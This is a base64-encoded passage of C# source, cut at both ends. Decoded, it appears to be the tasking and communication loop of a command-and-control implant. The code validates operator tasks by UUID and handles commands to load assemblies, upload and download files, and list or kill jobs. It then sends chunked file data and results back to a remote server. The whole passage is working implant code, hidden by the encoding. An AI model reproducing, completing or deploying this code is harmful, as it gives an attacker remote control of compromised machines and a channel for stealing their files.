ldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBpZiAoZmluYWxfcmVzdWx0LlN1YnN0cmluZygwLCAzNikgIT0gQ29uZmlnLlVVSUQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZSBHZXRUYXNrUmVzcG9uc2UgPSBVdGlscy5HZXRUYXNraW5nUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGlmIChHZXRUYXNrUmVzcG9uc2UudGFza3NbMF0uY29tbWFuZCA9PSAiIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuVGFzayB0YXNrIGluIEdldFRhc2tSZXNwb25zZS50YXNrcykgew0KICAgICAgICAgICAgICAgICAgICBVdGlscy5Kb2IgSm9iID0gbmV3IFV0aWxzLkpvYg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBqb2JfaWQgPSBKb2JMaXN0LmpvYl9jb3VudCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSB0YXNrLmlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBqb2Jfc3RhcnRlZCA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRhc2suY29tbWFuZCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB0YXNrLnBhcmFtZXRlcnMsDQogICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSAwDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IiB8fCBKb2IuY29tbWFuZCA9PSAidXBsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnVwbG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0gPSAxOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJkb3dubG9hZCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5kb3dubG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImpvYnMiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBNb2R1bGVzLkdldEpvYnMoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9ia2lsbCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNb2R1bGVzLktpbGxKb2IoSm9iTGlzdCwgSW50MzIuUGFyc2UoSm9iLnBhcmFtZXRlcnMpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkpvYiBzdWNjZXNzZnVsbHkgcmVtb3ZlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IHJlbW92ZSBqb2IiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5BZGQoSm9iKTsNCiAgICAgICAgICAgICAgICAgICAgKytKb2JMaXN0LmpvYl9jb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgVXRpbHMuVXBsb2FkUmVzcG9uc2UgR2V0VXBsb2FkKFV0aWxzLlVwbG9hZCBVcGxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IFV0aWxzLlVwbG9hZFJlc3BvbnNlLkZyb21Kc29uKGZpbmFsX3Jlc3VsdC5TdWJzdHJpbmcoMzYpKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBuZXcgVXRpbHMuVXBsb2FkUmVzcG9uc2UgeyB9Ow0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBQb3N0UmVzcG9uc2UoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5Qb3N0UmVzcG9uc2UgUG9zdFJlc3BvbnNlID0gbmV3IFV0aWxzLlBvc3RSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInBvc3RfcmVzcG9uc2UiLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSB7IH0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21wbGV0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5zdWNjZXNzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gImVycm9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gImZhbHNlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSm9iLnRvdGFsX2NodW5rcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBKb2IuY2h1bmtzWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICgoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSAmJiAoIUpvYi51cGxvYWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtfbnVtICE9IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLnJlc3BvbnNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBEYXRhID0gVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIGlmIChEYXRhLkNvbnRhaW5zKCJbXSIpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBQb3N0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZVJlc3BvbnNlIFBvc3RSZXNwb25zZVJlc3BvbnNlID0gVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlJlc3BvbnNlIFJlc3BvbnNlIGluIFBvc3RSZXNwb25zZVJlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRhc2tfaWQgPT0gUmVzcG9uc2UudGFza19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChSZXNwb25zZS5zdGF0dXMgPT0gInN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBSZXNwb25zZS5maWxlX2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyA9PSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmVBdCgwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgI